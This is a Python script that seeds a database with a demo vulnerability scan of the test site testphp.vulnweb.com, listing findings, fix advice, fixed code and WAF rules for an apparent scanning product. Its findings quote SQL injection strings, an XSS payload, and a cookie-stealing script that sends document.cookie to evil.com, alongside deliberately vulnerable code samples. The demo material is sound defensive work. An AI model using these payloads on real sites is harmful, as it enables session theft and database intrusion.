#!/usr/bin/env python3
"""Run: python seed_demo.py — creates a complete demo scan in the DB."""

import sys, os, uuid, json
sys.path.insert(0, os.path.dirname(__file__))

from sqlalchemy.orm import Session
from models.database import SessionLocal, engine
from models.models import Base, Scan, Finding, AttackSurface
from datetime import datetime, timedelta

Base.metadata.create_all(bind=engine)

DEMO_SCAN = {
    "id": "00000000-0000-0000-0000-000000000001",
    "scan_type": "url",
    "target": "http://testphp.vulnweb.com",
    "status": "complete",
    "risk_score": 28,
    "intensity": "standard",
    "created_at": datetime.utcnow() - timedelta(hours=1),
    "completed_at": datetime.utcnow() - timedelta(minutes=45),
    "duration_seconds": 847
}

DEMO_FINDINGS = [
    {
        "vuln_type": "SQL Injection",
        "severity": "critical",
        "url": "http://testphp.vulnweb.com/listproducts.php",
        "parameter": "cat",
        "evidence": "' OR '1'='1",
        "description": "SQL injection vulnerability in the cat parameter allows attackers to execute arbitrary SQL commands against the database.",
        "attack_worked": True,
        "owasp_category": "A03:2021 - Injection",
        "tool_source": "zap",
        "ai_fix": {
            "explanation": "User input is directly concatenated into a SQL query without sanitization, allowing attackers to inject SQL commands.",
            "attack_scenario": "An attacker passes ' OR 1=1-- as the cat parameter to bypass WHERE conditions and retrieve all records from the database.",
            "vulnerable_code": "query = 'SELECT * FROM products WHERE cat=' + request.args.get('cat')",
            "fixed_code": "query = 'SELECT * FROM products WHERE cat=?'\ncursor.execute(query, [request.args.get('cat')])",
            "diff": "- query = 'SELECT * FROM products WHERE cat=' + request.args.get('cat')\n+ query = 'SELECT * FROM products WHERE cat=?'\n+ cursor.execute(query, [request.args.get('cat')])",
            "ai_suggestion": "Use parameterized queries — never concatenate user input into SQL strings",
            "effort_minutes": 15,
            "confidence": 95,
            "owasp_category": "A03:2021 - Injection",
            "defense_method": "Parameterized queries (prepared statements) prevent SQL injection by separating code from data",
            "ide_prompt": "In this PHP application, the file listproducts.php has a critical SQL injection vulnerability on line ~45. The 'cat' parameter from the GET request is concatenated directly into a SQL query string. An attacker can pass ' OR 1=1-- to retrieve all products regardless of category, or more damaging payloads to dump the entire database. To fix this: 1) Replace the direct string concatenation with a prepared statement. 2) Use mysqli_prepare() or PDO with bindParam(). 3) The secure pattern is: $stmt = $conn->prepare('SELECT * FROM products WHERE cat=?'); $stmt->bind_param('i', $cat); where $cat is the sanitized input. Apply this pattern to ALL database queries in this file."
        },
        "waf_rule": {
            "modsecurity": "SecRule ARGS:cat \"@detectSQLi\" \"id:10001,phase:2,deny,status:403,log,msg:'ShieldSentinel: SQL Injection Blocked'\"",
            "cloudflare": "(http.request.uri.query contains \"'\") and (http.request.uri contains \"/listproducts.php\")",
            "description": "Blocks SQL injection attempts in the cat parameter"
        }
    },
    {
        "vuln_type": "Hardcoded Secret",
        "severity": "critical",
        "file_path": "config/database.php",
        "line_number": 12,
        "evidence": "password = 'admin123'  [REDACTED]",
        "description": "Hardcoded database password found in source code. Anyone with code access can authenticate directly to the database.",
        "attack_worked": True,
        "owasp_category": "A07:2021 - Identification and Authentication Failures",
        "tool_source": "gitleaks",
        "ai_fix": {
            "explanation": "Database credentials are hardcoded directly in the source code, exposing them to anyone who can read the file.",
            "attack_scenario": "An attacker who gains code read access (via path traversal, git exposure, or insider threat) can use the hardcoded password to directly authenticate to the database.",
            "vulnerable_code": "$db_password = 'admin123';",
            "fixed_code": "$db_password = getenv('DB_PASSWORD');\nif (!$db_password) throw new Exception('DB_PASSWORD not set');",
            "ai_suggestion": "Move all credentials to environment variables — never commit secrets to source code",
            "effort_minutes": 10,
            "confidence": 99,
            "owasp_category": "A07:2021 - Identification and Authentication Failures",
            "defense_method": "Environment variables loaded from .env files (not committed to git) keep credentials out of code",
            "ide_prompt": "In config/database.php line 12, there is a hardcoded database password '$db_password = 'admin123''. This is a critical security issue — anyone with code access can use this password directly. Fix: 1) Replace the hardcoded value with getenv('DB_PASSWORD'). 2) Create a .env file with DB_PASSWORD=admin123. 3) Add .env to .gitignore immediately. 4) Change the actual database password since it's already been exposed. 5) Check all other files in config/ for similar hardcoded credentials and apply the same fix."
        }
    },
    {
        "vuln_type": "Cross Site Scripting (Reflected)",
        "severity": "high",
        "url": "http://testphp.vulnweb.com/search.php",
        "parameter": "test",
        "evidence": "<script>alert('XSS')</script>",
        "description": "Reflected XSS allows attackers to inject scripts via the search parameter that execute in victims' browsers.",
        "attack_worked": True,
        "owasp_category": "A03:2021 - Injection",
        "tool_source": "zap",
        "ai_fix": {
            "explanation": "The search parameter value is reflected into the HTML page without encoding, allowing script injection.",
            "attack_scenario": "Attacker sends victim a link with ?test=<script>document.location='https://evil.com?c='+document.cookie</script> to steal the victim's session cookie.",
            "vulnerable_code": "echo 'Search results for: ' . $_GET['test'];",
            "fixed_code": "echo 'Search results for: ' . htmlspecialchars($_GET['test'], ENT_QUOTES, 'UTF-8');",
            "ai_suggestion": "Always use htmlspecialchars() before reflecting user input in HTML output",
            "effort_minutes": 5,
            "confidence": 92,
            "owasp_category": "A03:2021 - Injection",
            "defense_method": "HTML encoding (htmlspecialchars in PHP, escapeHtml in JS) converts dangerous characters to safe HTML entities",
            "ide_prompt": "In search.php, there is a reflected XSS vulnerability where the 'test' GET parameter is echoed directly into the HTML response without encoding. An attacker can craft a URL with a malicious script payload that executes in the victim's browser when they visit the link. Fix: wrap all user input echoed to HTML with htmlspecialchars($value, ENT_QUOTES, 'UTF-8'). Search for all instances of $_GET, $_POST, $_REQUEST, $_COOKIE being echoed or printed and apply this encoding to every single one."
        }
    },
    { "vuln_type": "Path Traversal", "severity": "high", "url": "http://testphp.vulnweb.com/showimage.php", "parameter": "file", "attack_worked": True, "description": "Arbitrary file read via path traversal in the file parameter." },
    { "vuln_type": "Cross-Site Request Forgery", "severity": "medium", "url": "http://testphp.vulnweb.com/userinfo.php", "attack_worked": True, "description": "CSRF vulnerability allows unauthorized actions on behalf of the user." },
    { "vuln_type": "Missing Security Header: X-Frame-Options", "severity": "medium", "url": "http://testphp.vulnweb.com/", "attack_worked": True, "description": "Missing X-Frame-Options allows clickjacking." },
    { "vuln_type": "Missing Security Header: Strict-Transport-Security", "severity": "medium", "url": "http://testphp.vulnweb.com/", "attack_worked": True, "description": "Missing HSTS." },
    { "vuln_type": "Missing Security Header: Content-Security-Policy", "severity": "medium", "url": "http://testphp.vulnweb.com/", "attack_worked": True, "description": "Missing CSP." },
    { "vuln_type": "Vulnerable Dependency", "severity": "high", "file_path": "package.json", "attack_worked": True, "description": "lodash@4.17.15 CVE-2021-23337." },
    { "vuln_type": "Cookie Without Secure Flag", "severity": "medium", "url": "http://testphp.vulnweb.com/login.php", "attack_worked": True, "description": "Session cookie is missing the Secure flag." },
    { "vuln_type": "Information Disclosure", "severity": "medium", "url": "http://testphp.vulnweb.com/phpinfo.php", "attack_worked": True, "description": "PHP info page exposes internal configuration." },
    { "vuln_type": "Directory Listing", "severity": "medium", "url": "http://testphp.vulnweb.com/images/", "attack_worked": True, "description": "Directory listing is enabled on images folder." },
    { "vuln_type": "Insecure HTTP Method", "severity": "low", "url": "http://testphp.vulnweb.com/", "attack_worked": True, "description": "TRACE method is enabled." },
    { "vuln_type": "SSL/TLS Issue", "severity": "low", "url": "http://testphp.vulnweb.com/", "attack_worked": True, "description": "Supports TLS 1.0." },
]

ATTACKS_BLOCKED = [
    {"vuln_type": "Remote OS Command Injection", "severity": "info", "attack_worked": False, "description": "No command injection vulnerabilities detected — system appears protected"},
    {"vuln_type": "XML External Entity", "severity": "info", "attack_worked": False, "description": "No XXE vulnerabilities detected"},
    {"vuln_type": "Server-Side Request Forgery", "severity": "info", "attack_worked": False, "description": "No SSRF vulnerabilities detected"},
    {"vuln_type": "Remote File Inclusion", "severity": "info", "attack_worked": False, "description": "No RFI vulnerabilities detected"},
    {"vuln_type": "Insecure Deserialization", "severity": "info", "attack_worked": False, "description": "No deserialization vulnerabilities detected"},
]

def seed():
    db = SessionLocal()
    try:
        existing = db.query(Scan).filter(Scan.id == uuid.UUID(DEMO_SCAN["id"])).first()
        if existing:
            print("Demo scan already exists. Deleting and recreating...")
            db.query(Finding).filter(Finding.scan_id == uuid.UUID(DEMO_SCAN["id"])).delete()
            db.query(AttackSurface).filter(AttackSurface.scan_id == uuid.UUID(DEMO_SCAN["id"])).delete()
            db.delete(existing)
            db.commit()
        
        scan = Scan(**DEMO_SCAN)
        scan.id = uuid.UUID(DEMO_SCAN["id"])
        db.add(scan)
        db.commit()
        
        for f in DEMO_FINDINGS + ATTACKS_BLOCKED:
            finding = Finding(
                scan_id=uuid.UUID(DEMO_SCAN["id"]),
                **{k: v for k, v in f.items() if k != "id"}
            )
            db.add(finding)
        
        surface = AttackSurface(
            scan_id=uuid.UUID(DEMO_SCAN["id"]),
            nodes=[
                {"id": "/", "label": "/", "risk": "safe", "vuln_count": 0, "vulns": []},
                {"id": "/listproducts.php", "label": "/listproducts.php", "risk": "critical", "vuln_count": 2, "vulns": ["SQL Injection"]},
                {"id": "/search.php", "label": "/search.php", "risk": "high", "vuln_count": 1, "vulns": ["XSS"]},
                {"id": "/userinfo.php", "label": "/userinfo.php", "risk": "medium", "vuln_count": 1, "vulns": ["CSRF"]},
                {"id": "/login.php", "label": "/login.php", "risk": "safe", "vuln_count": 0, "vulns": []},
                {"id": "/admin/", "label": "/admin/", "risk": "high", "vuln_count": 1, "vulns": ["Directory Listing"]},
            ],
            edges=[
                {"source": "/", "target": "/listproducts.php"},
                {"source": "/", "target": "/search.php"},
                {"source": "/", "target": "/userinfo.php"},
                {"source": "/", "target": "/login.php"},
                {"source": "/", "target": "/admin/"},
            ]
        )
        db.add(surface)
        db.commit()
        print("✅ Demo scan seeded successfully!")
        print(f"   Scan ID: {DEMO_SCAN['id']}")
        print(f"   Risk Score: {DEMO_SCAN['risk_score']}/100")
        print(f"   Findings: {len(DEMO_FINDINGS)} vulnerabilities + {len(ATTACKS_BLOCKED)} protected")
        print(f"   View at: http://localhost:3000/scan/{DEMO_SCAN['id']}")
    finally:
        db.close()

if __name__ == "__main__":
    seed()
